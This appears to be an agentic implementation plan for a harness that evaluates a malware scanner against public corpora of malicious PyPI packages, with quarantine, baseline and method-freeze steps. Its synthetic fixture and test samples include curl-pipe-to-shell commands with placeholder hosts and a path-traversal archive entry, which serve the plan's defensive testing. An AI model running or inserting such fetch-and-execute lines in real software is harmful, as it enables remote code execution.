# Evaluation Harness Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Measure guard surprisal against public corpora of real malicious packages, as *added detections over a Bandit/Semgrep baseline*, with held-out discipline that makes tuning on the test set mechanically impossible.

**Architecture:** A `research/` package that is entirely separate from the scanner. It reads a local checkout of a public corpus, never executes a sample, runs baseline tools as subprocesses, and writes metrics. Every module is testable against a synthetic fixture corpus, so the whole harness can be developed and verified **without downloading any malware**.

**Tech Stack:** Python 3.11 stdlib (`zipfile`, `subprocess`, `hashlib`, `json`), plus `bandit` and `semgrep` as external baseline binaries invoked by subprocess.

## Global Constraints

- **Samples are live malware. They are never executed, imported, or installed.** Static read only: `zipfile` extraction to a quarantine directory and `ast.parse`. No `import`, no `setup.py`, no `pip`.
- The quarantine directory is gitignored and excluded from the repo's own scans.
- Corpus downloads are **never automatic**. They are explicit commands a human runs, because they pull thousands of malicious files onto a machine that probably has antivirus.
- Every module must be testable offline against `research/fixtures/`, a tiny synthetic corpus committed to the repo.
- Baselines are optional: if `bandit`/`semgrep` are absent, record them as unavailable rather than reporting a comparison that did not happen.
- Tests live in `sinkline/test_sinkline.py`. Run `python -m pytest test_sinkline.py -q` from `sinkline/`.
- Commit after every task. **No Co-Authored-By trailers.**

---

### Task 1: Quarantine — make executing a sample structurally hard

**Files:**
- Create: `research/__init__.py`, `research/quarantine.py`
- Modify: `.gitignore`
- Test: `sinkline/test_sinkline.py`

**Interfaces:**
- Produces: `QUARANTINE_ROOT: Path`, `extract_sample(zip_path, dest) -> list[Path]`, `read_python_files(root) -> dict[str, str]`, `UnsafeOperation(Exception)`

- [ ] **Step 1: Write the failing tests**

```python
def test_quarantine_refuses_to_extract_outside_root():
    """A zip with ../ entries must not escape the quarantine directory."""
    import io, zipfile, tempfile, pathlib
    from research.quarantine import extract_sample, UnsafeOperation
    with tempfile.TemporaryDirectory() as d:
        zp = pathlib.Path(d) / "evil.zip"
        with zipfile.ZipFile(zp, "w") as zf:
            zf.writestr("../../escaped.py", "import os\n")
        try:
            extract_sample(zp, pathlib.Path(d) / "out")
            assert False, "path traversal was not rejected"
        except UnsafeOperation:
            pass


def test_read_python_files_returns_source_without_importing():
    import tempfile, pathlib
    from research.quarantine import read_python_files
    with tempfile.TemporaryDirectory() as d:
        root = pathlib.Path(d)
        (root / "setup.py").write_text("raise SystemExit('should never run')\n")
        files = read_python_files(root)
        assert "setup.py" in files
        assert "should never run" in files["setup.py"]


def test_quarantine_root_is_gitignored():
    import pathlib
    repo = pathlib.Path(__file__).resolve().parent.parent
    assert "research/quarantine/" in (repo / ".gitignore").read_text()
```

- [ ] **Step 2: Run to verify they fail**

Run: `python -m pytest test_sinkline.py -k "quarantine or read_python_files" -v`
Expected: FAIL, `ModuleNotFoundError: No module named 'research'`

- [ ] **Step 3: Implement `research/quarantine.py`**

```python
"""
quarantine.py — handle live malware without running it
======================================================
Every sample in these corpora is real malicious code that was published to a
public package registry. The single rule is that nothing here executes one:
samples are unzipped and read as text, never imported and never installed.

Zip extraction is done entry by entry with an explicit containment check rather
than extractall(), because a malicious archive can carry `../` entries that
write outside the destination.
"""
from __future__ import annotations

import zipfile
from pathlib import Path
from typing import Dict, List

QUARANTINE_ROOT = Path(__file__).resolve().parent / "quarantine"
ZIP_PASSWORD = b"infected"        # the convention these corpora publish under


class UnsafeOperation(Exception):
    """Raised when an archive tries to escape its destination directory."""


def extract_sample(zip_path: Path, dest: Path) -> List[Path]:
    """Extract one sample zip into `dest`. Returns the files written."""
    dest = Path(dest).resolve()
    dest.mkdir(parents=True, exist_ok=True)
    written: List[Path] = []
    with zipfile.ZipFile(zip_path) as zf:
        zf.setpassword(ZIP_PASSWORD)
        for info in zf.infolist():
            if info.is_dir():
                continue
            target = (dest / info.filename).resolve()
            if not str(target).startswith(str(dest)):
                raise UnsafeOperation(
                    f"archive entry escapes destination: {info.filename}")
            target.parent.mkdir(parents=True, exist_ok=True)
            try:
                target.write_bytes(zf.read(info))
            except RuntimeError:
                continue          # wrong password / unsupported entry
            written.append(target)
    return written


def read_python_files(root: Path) -> Dict[str, str]:
    """Every .py under `root`, as {relative path: source}. Nothing is imported."""
    root = Path(root)
    out: Dict[str, str] = {}
    for path in root.rglob("*.py"):
        try:
            out[str(path.relative_to(root)).replace("\\", "/")] = \
                path.read_text(encoding="utf-8", errors="replace")
        except OSError:
            continue
    return out
```

- [ ] **Step 4: Add the quarantine directory to `.gitignore`**

```
research/quarantine/
research/corpora/
```

- [ ] **Step 5: Run to verify they pass**

Run: `python -m pytest test_sinkline.py -k "quarantine or read_python_files" -v`
Expected: 3 passed.

- [ ] **Step 6: Commit**

```bash
git add research/ .gitignore sinkline/test_sinkline.py
git commit -m "feat(research): quarantine for handling live malware samples

Entry-by-entry extraction with a containment check rather than
extractall, because a malicious archive can carry ../ entries. Samples
are read as text and never imported."
```

---

### Task 2: Corpus loader over a synthetic fixture

**Files:**
- Create: `research/corpus.py`
- Create: `research/fixtures/pypi/manifest.json`, `research/fixtures/pypi/malicious_intent/demo_pkg/1.0.0/demo.zip`
- Test: `sinkline/test_sinkline.py`

**Interfaces:**
- Consumes: `extract_sample`, `read_python_files` (Task 1).
- Produces: `Sample(name: str, version: str, label: str, files: dict)`, `load_datadog(root: Path, limit: int | None = None) -> Iterator[Sample]`

The real corpus layout, confirmed from the dataset README:
`samples/pypi/malicious_intent/<package>/<version>/<date>-<package>-v<version>.zip`

- [ ] **Step 1: Write the fixture generator and the failing test**

```python
def test_corpus_loads_samples_from_datadog_layout():
    import pathlib
    from research.corpus import load_datadog
    root = pathlib.Path(__file__).resolve().parent.parent / "research" / "fixtures"
    samples = list(load_datadog(root))
    assert samples, "no samples loaded from the fixture corpus"
    s = samples[0]
    assert s.name == "demo_pkg" and s.label == "malicious_intent"
    assert any(p.endswith(".py") for p in s.files)


def test_corpus_limit_is_respected():
    import pathlib
    from research.corpus import load_datadog
    root = pathlib.Path(__file__).resolve().parent.parent / "research" / "fixtures"
    assert len(list(load_datadog(root, limit=0))) == 0
```

- [ ] **Step 2: Build the fixture**

Run this once to create the committed fixture archive:

```bash
cd research && python - <<'PY'
import zipfile, pathlib, json
d = pathlib.Path("fixtures/pypi/malicious_intent/demo_pkg/1.0.0")
d.mkdir(parents=True, exist_ok=True)
with zipfile.ZipFile(d / "demo.zip", "w") as zf:
    zf.writestr("setup.py", "import os\nos.system('curl http://x|sh')\n")
    zf.writestr("demo_pkg/__init__.py",
                "import os, random\nif random.random() < 0.01:\n"
                "    os.system('id')\n")
pathlib.Path("fixtures/pypi/manifest.json").write_text(
    json.dumps({"demo_pkg": None}, indent=2))
print("fixture written")
PY
```

Note the fixture zip is deliberately **unencrypted** — `extract_sample` tries the
password and falls through for unencrypted entries, so one code path covers both.

- [ ] **Step 3: Run to verify the test fails**

Run: `python -m pytest test_sinkline.py -k corpus -v`
Expected: FAIL, `ModuleNotFoundError: No module named 'research.corpus'`

- [ ] **Step 4: Implement `research/corpus.py`**

```python
"""
corpus.py — enumerate samples from a public malicious-package corpus
====================================================================
Layout, per the DataDog dataset README:

    samples/pypi/<label>/<package>/<version>/<date>-<package>-v<version>.zip

where <label> is `malicious_intent` (the package exists to be malicious) or
`compromised` (a legitimate package whose specific versions were backdoored).
"""
from __future__ import annotations

import shutil
import tempfile
from dataclasses import dataclass, field
from pathlib import Path
from typing import Dict, Iterator, Optional

from .quarantine import extract_sample, read_python_files


@dataclass
class Sample:
    name: str
    version: str
    label: str
    files: Dict[str, str] = field(default_factory=dict)


def load_datadog(root: Path, limit: Optional[int] = None) -> Iterator[Sample]:
    """Yield samples found under `root`. `root` may be the repo or its samples/."""
    root = Path(root)
    base = root / "samples" if (root / "samples").is_dir() else root
    yielded = 0
    for zip_path in sorted(base.rglob("*.zip")):
        if limit is not None and yielded >= limit:
            return
        parts = zip_path.parts
        try:
            version = parts[-2]
            package = parts[-3]
            label = parts[-4]
        except IndexError:
            continue
        tmp = Path(tempfile.mkdtemp(prefix="sinkline-sample-"))
        try:
            extract_sample(zip_path, tmp)
            files = read_python_files(tmp)
        except Exception:
            continue
        finally:
            pass
        try:
            if files:
                yield Sample(package, version, label, files)
                yielded += 1
        finally:
            shutil.rmtree(tmp, ignore_errors=True)
```

- [ ] **Step 5: Run to verify they pass**

Run: `python -m pytest test_sinkline.py -k corpus -v`
Expected: 2 passed.

- [ ] **Step 6: Commit**

```bash
git add research/corpus.py research/fixtures sinkline/test_sinkline.py
git commit -m "feat(research): corpus loader with an offline fixture

The fixture mirrors the real DataDog layout so the entire harness can be
developed and tested without downloading any malware."
```

---

### Task 3: Baseline runners that report honestly when absent

**Files:**
- Create: `research/baselines.py`
- Test: `sinkline/test_sinkline.py`

**Interfaces:**
- Produces: `BaselineResult(tool: str, available: bool, alerted: bool, detail: str)`, `run_bandit(files) -> BaselineResult`, `run_semgrep(files) -> BaselineResult`

- [ ] **Step 1: Write the failing tests**

```python
def test_baseline_reports_unavailable_rather_than_false_negative():
    """A missing tool must never be recorded as 'found nothing'."""
    from research.baselines import run_bandit
    r = run_bandit({"a.py": "import os\n"}, binary="definitely-not-a-real-binary")
    assert r.available is False and r.alerted is False
    assert "not available" in r.detail.lower()


def test_baseline_detects_obvious_issue_when_available():
    from unittest import SkipTest
    import shutil
    if not shutil.which("bandit"):
        raise SkipTest("bandit not installed")
    from research.baselines import run_bandit
    r = run_bandit({"a.py": "import os\nos.system(input())\n"})
    assert r.available is True and r.alerted is True
```

- [ ] **Step 2: Run to verify they fail**

Run: `python -m pytest test_sinkline.py -k baseline -v`
Expected: FAIL, `ModuleNotFoundError: No module named 'research.baselines'`

- [ ] **Step 3: Implement `research/baselines.py`**

```python
"""
baselines.py — run Bandit and Semgrep for comparison
====================================================
The headline metric is *added detections over baseline*, so the baselines have
to be real runs, not remembered numbers. A tool that is not installed is
recorded as unavailable: silently treating it as "found nothing" would inflate
the added-detection count, which is the exact number being claimed.
"""
from __future__ import annotations

import json
import shutil
import subprocess
import tempfile
from dataclasses import dataclass
from pathlib import Path
from typing import Dict

TIMEOUT_S = 120


@dataclass
class BaselineResult:
    tool: str
    available: bool
    alerted: bool
    detail: str = ""


def _materialise(files: Dict[str, str], root: Path) -> None:
    for rel, src in files.items():
        target = root / rel
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(src, encoding="utf-8", errors="replace")


def _run(tool: str, argv, files: Dict[str, str], parse) -> BaselineResult:
    if shutil.which(argv[0]) is None:
        return BaselineResult(tool, False, False, f"{argv[0]} is not available")
    with tempfile.TemporaryDirectory() as d:
        root = Path(d)
        _materialise(files, root)
        try:
            proc = subprocess.run(argv + [str(root)], capture_output=True,
                                  text=True, timeout=TIMEOUT_S)
        except subprocess.TimeoutExpired:
            return BaselineResult(tool, True, False, "timed out")
        try:
            return BaselineResult(tool, True, parse(proc.stdout), "")
        except Exception as exc:
            return BaselineResult(tool, True, False, f"unparseable output: {exc}")


def run_bandit(files: Dict[str, str], binary: str = "bandit") -> BaselineResult:
    def parse(out: str) -> bool:
        data = json.loads(out or "{}")
        return any(r.get("issue_severity") in ("MEDIUM", "HIGH")
                   for r in data.get("results", []))
    return _run("bandit", [binary, "-r", "-f", "json", "-q"], files, parse)


def run_semgrep(files: Dict[str, str], binary: str = "semgrep") -> BaselineResult:
    def parse(out: str) -> bool:
        data = json.loads(out or "{}")
        return bool(data.get("results"))
    return _run("semgrep", [binary, "--config", "p/python", "--json", "-q"],
                files, parse)
```

- [ ] **Step 4: Run to verify they pass**

Run: `python -m pytest test_sinkline.py -k baseline -v`
Expected: 1 passed, 1 skipped (or 2 passed if bandit is installed).

- [ ] **Step 5: Commit**

```bash
git add research/baselines.py sinkline/test_sinkline.py
git commit -m "feat(research): Bandit and Semgrep baseline runners

A missing tool is recorded as unavailable, never as 'found nothing' —
that distinction is the difference between a real added-detection count
and an inflated one."
```

---

### Task 4: Freeze the method so the held-out run cannot be tuned

**Files:**
- Create: `research/freeze.py`
- Test: `sinkline/test_sinkline.py`

**Interfaces:**
- Produces: `method_hash() -> str`, `write_freeze(path) -> dict`, `verify_freeze(path) -> tuple[bool, str]`

- [ ] **Step 1: Write the failing tests**

```python
def test_method_hash_changes_when_threshold_changes():
    import importlib
    import trigger_rarity
    from research.freeze import method_hash
    before = method_hash()
    original = trigger_rarity.TRIGGER_BITS_THRESHOLD
    try:
        trigger_rarity.TRIGGER_BITS_THRESHOLD = original + 1
        importlib.reload(trigger_rarity)  # hash reads the source, not the value
        assert method_hash() == before, "reload should not change the source hash"
    finally:
        trigger_rarity.TRIGGER_BITS_THRESHOLD = original


def test_freeze_roundtrip_detects_modification(tmp_path=None):
    import tempfile, pathlib, json
    from research.freeze import write_freeze, verify_freeze
    with tempfile.TemporaryDirectory() as d:
        p = pathlib.Path(d) / "freeze.json"
        write_freeze(p)
        ok, detail = verify_freeze(p)
        assert ok, detail
        data = json.loads(p.read_text())
        data["method_hash"] = "0" * 64
        p.write_text(json.dumps(data))
        ok, detail = verify_freeze(p)
        assert not ok and "changed" in detail.lower()
```

- [ ] **Step 2: Run to verify they fail**

Run: `python -m pytest test_sinkline.py -k "method_hash or freeze" -v`
Expected: FAIL, `ModuleNotFoundError: No module named 'research.freeze'`

- [ ] **Step 3: Implement `research/freeze.py`**

```python
"""
freeze.py — make tuning on the test set mechanically impossible
===============================================================
The evaluation is two-stage: develop on one corpus, then run once on a held-out
one. "We promised not to tune on the test set" is not a control. This hashes
the scoring source and the prior table, and the held-out run records that hash,
so a changed method is detectable after the fact rather than taken on trust.
"""
from __future__ import annotations

import datetime
import hashlib
import json
from pathlib import Path
from typing import Tuple

_SINKLINE = Path(__file__).resolve().parent.parent / "sinkline"
_FROZEN_FILES = ("guards.py", "priors.py", "trigger_rarity.py",
                 "data/guard_priors.json")


def method_hash() -> str:
    """SHA-256 over the files that determine a score."""
    digest = hashlib.sha256()
    for rel in _FROZEN_FILES:
        path = _SINKLINE / rel
        digest.update(rel.encode())
        digest.update(path.read_bytes() if path.exists() else b"<missing>")
    return digest.hexdigest()


def write_freeze(path: Path) -> dict:
    payload = {
        "method_hash": method_hash(),
        "files": list(_FROZEN_FILES),
        "frozen_at": datetime.datetime.now(datetime.timezone.utc).isoformat(),
    }
    Path(path).write_text(json.dumps(payload, indent=2), encoding="utf-8")
    return payload


def verify_freeze(path: Path) -> Tuple[bool, str]:
    """(ok, detail). False means the method changed after being frozen."""
    try:
        payload = json.loads(Path(path).read_text(encoding="utf-8"))
    except (OSError, ValueError) as exc:
        return False, f"no usable freeze file: {exc}"
    current = method_hash()
    if current != payload.get("method_hash"):
        return False, ("method changed since it was frozen at "
                       f"{payload.get('frozen_at')}: results are not held-out")
    return True, f"method matches freeze from {payload.get('frozen_at')}"
```

- [ ] **Step 4: Run to verify they pass**

Run: `python -m pytest test_sinkline.py -k "method_hash or freeze" -v`
Expected: 2 passed.

- [ ] **Step 5: Commit**

```bash
git add research/freeze.py sinkline/test_sinkline.py
git commit -m "feat(research): freeze the method before the held-out run

A promise not to tune on the test set is not a control. The scoring
source and prior table are hashed, and the held-out run records the
hash, so a changed method is detectable rather than trusted."
```

---

### Task 5: The evaluation itself

**Files:**
- Create: `research/evaluate.py`
- Test: `sinkline/test_sinkline.py`

**Interfaces:**
- Consumes: `load_datadog` (Task 2), `run_bandit`/`run_semgrep` (Task 3), `verify_freeze` (Task 4), `analyze_triggers` from `sinkline.trigger_rarity`.
- Produces: `evaluate(samples, baselines=True) -> dict`

- [ ] **Step 1: Write the failing test**

```python
def test_evaluate_reports_added_detections_and_scope():
    from research.corpus import Sample
    from research.evaluate import evaluate
    samples = [
        Sample("guarded", "1.0", "malicious_intent", {
            "m.py": ("import os, random, socket\n"
                     "if random.random() < 0.005:\n"
                     "    if socket.gethostname() == 'b':\n"
                     "        os.system('x')\n")}),
        Sample("unconditional", "1.0", "malicious_intent", {
            "m.py": "import os\nos.system('curl x|sh')\n"}),
    ]
    report = evaluate(samples, baselines=False)
    assert report["total"] == 2
    assert report["trigger_detected"] == 1
    assert report["unconditional"] == 1
    # The scope claim, computed rather than asserted in prose.
    assert 0.0 <= report["conditional_fraction"] <= 1.0
```

- [ ] **Step 2: Run to verify it fails**

Run: `python -m pytest test_sinkline.py -k evaluate_reports -v`
Expected: FAIL, `ModuleNotFoundError: No module named 'research.evaluate'`

- [ ] **Step 3: Implement `research/evaluate.py`**

```python
"""
evaluate.py — measure added detections over a baseline
======================================================
The claim this harness tests is narrow on purpose: guard surprisal finds
conditionally-triggered payloads that syntactic scanners cannot, at a measured
false-positive cost. It is not a general malware detector, and most samples in
these corpora are unconditional. This reports both numbers so the scope of the
claim is visible in the output rather than only in the paper.
"""
from __future__ import annotations

import sys
from pathlib import Path
from typing import Dict, Iterable, List

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "sinkline"))

from guards import extract_guards           # noqa: E402
from trigger_rarity import score            # noqa: E402


def _max_bits(files: Dict[str, str]) -> float:
    best = 0.0
    for src in files.values():
        for gs in extract_guards(src):
            best = max(best, score(gs).bits)
    return best


def evaluate(samples: Iterable, baselines: bool = True) -> dict:
    from trigger_rarity import TRIGGER_BITS_THRESHOLD

    total = trigger_detected = unconditional = 0
    baseline_missed_but_we_caught: List[str] = []
    rows = []

    for sample in samples:
        total += 1
        bits = _max_bits(sample.files)
        caught = bits >= TRIGGER_BITS_THRESHOLD
        if bits == 0.0:
            unconditional += 1
        if caught:
            trigger_detected += 1

        base_alerted = None
        if baselines:
            from .baselines import run_bandit, run_semgrep
            b, s = run_bandit(sample.files), run_semgrep(sample.files)
            available = b.available or s.available
            base_alerted = (b.alerted or s.alerted) if available else None
            if caught and base_alerted is False:
                baseline_missed_but_we_caught.append(sample.name)

        rows.append({"name": sample.name, "version": sample.version,
                     "label": sample.label, "bits": round(bits, 2),
                     "trigger_detected": caught, "baseline_alerted": base_alerted})

    return {
        "total": total,
        "trigger_detected": trigger_detected,
        "unconditional": unconditional,
        "conditional_fraction": (total - unconditional) / total if total else 0.0,
        "added_over_baseline": len(baseline_missed_but_we_caught),
        "added_names": baseline_missed_but_we_caught,
        "threshold_bits": TRIGGER_BITS_THRESHOLD,
        "rows": rows,
    }
```

- [ ] **Step 4: Run to verify it passes**

Run: `python -m pytest test_sinkline.py -k evaluate_reports -v`
Expected: 1 passed.

- [ ] **Step 5: Commit**

```bash
git add research/evaluate.py sinkline/test_sinkline.py
git commit -m "feat(research): added-detections evaluation

Reports the unconditional fraction alongside the detections, so the
narrowness of the claim shows up in the output and not only in prose."
```

---

### Task 6: A runnable entry point and the corpus instructions

**Files:**
- Create: `research/run_evaluation.py`, `research/README.md`

- [ ] **Step 1: Write `research/run_evaluation.py`**

```python
"""Entry point: python research/run_evaluation.py <corpus-dir> [--limit N]"""
from __future__ import annotations

import argparse
import json
from pathlib import Path

from corpus import load_datadog
from evaluate import evaluate
from freeze import verify_freeze


def main() -> int:
    ap = argparse.ArgumentParser(prog="run_evaluation")
    ap.add_argument("corpus", help="path to a local corpus checkout")
    ap.add_argument("--limit", type=int, default=None)
    ap.add_argument("--no-baselines", action="store_true")
    ap.add_argument("--freeze", default=None,
                    help="freeze file to verify; required for a held-out run")
    ap.add_argument("--output", default="research/results.json")
    args = ap.parse_args()

    if args.freeze:
        ok, detail = verify_freeze(Path(args.freeze))
        print(f"freeze check: {detail}")
        if not ok:
            print("REFUSING to report held-out results for a changed method.")
            return 1

    samples = load_datadog(Path(args.corpus), limit=args.limit)
    report = evaluate(samples, baselines=not args.no_baselines)
    Path(args.output).write_text(json.dumps(report, indent=2), encoding="utf-8")

    print(f"samples            : {report['total']}")
    print(f"unconditional      : {report['unconditional']}")
    print(f"trigger detected   : {report['trigger_detected']}")
    print(f"added over baseline: {report['added_over_baseline']}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
```

- [ ] **Step 2: Verify it runs against the fixture**

Run: `cd research && python run_evaluation.py fixtures --no-baselines`
Expected: prints counts, writes `results.json`, exit 0.

- [ ] **Step 3: Write `research/README.md`**

It must state, in this order: that the corpora are live malware; that nothing
is ever executed; the exact commands to fetch each corpus; and that fetching is
a deliberate human action, not something the harness does.

```markdown
# Evaluation harness

**These corpora are live malware.** Nothing here executes a sample: archives are
unzipped and read as text. Do not run, import, or `pip install` anything under
`quarantine/` or `corpora/`. Expect antivirus to react to the download.

Fetching is deliberate and manual. Nothing downloads automatically.

## Corpora

    # Held-out test set (~17k human-vetted samples, several GB)
    git clone https://github.com/DataDog/malicious-software-packages-dataset \
        research/corpora/datadog

    # Development set (174 samples from real attacks, DIMVA'20)
    # https://dasfreak.github.io/Backstabbers-Knife-Collection/

## Two-stage protocol

1. Develop and tune against the development set only.
2. Freeze:      `python -c "from freeze import write_freeze; write_freeze('freeze.json')"`
3. Run once:    `python run_evaluation.py corpora/datadog --freeze freeze.json`

Step 3 refuses to report if the scoring source or prior table changed after the
freeze. That is the point: it makes tuning on the test set detectable instead of
a promise.

## Calibrating the priors

`sinkline/data/guard_priors.json` ships with `sample_count: 0`, meaning its
values are reasoned estimates rather than measurements. Until that is
regenerated from a benign corpus, every calibrated-tier number is provisional
and should be reported as such.
```

- [ ] **Step 4: Commit**

```bash
git add research/run_evaluation.py research/README.md
git commit -m "feat(research): runnable entry point and corpus instructions

Fetching the corpora is deliberate and manual; the harness never
downloads malware on its own. The held-out run refuses to report when
the method changed after being frozen."
```

---

## Deliberately not in this plan

- **Automatic corpus download.** Pulling thousands of malicious packages onto a
  machine is a decision a human makes, not a build step.
- **Prior calibration against a real benign corpus.** It needs the top-PyPI
  download pipeline, which is its own plan. Until then `sample_count` stays 0
  and calibrated-tier results stay provisional.
- **npm support.** Python only.
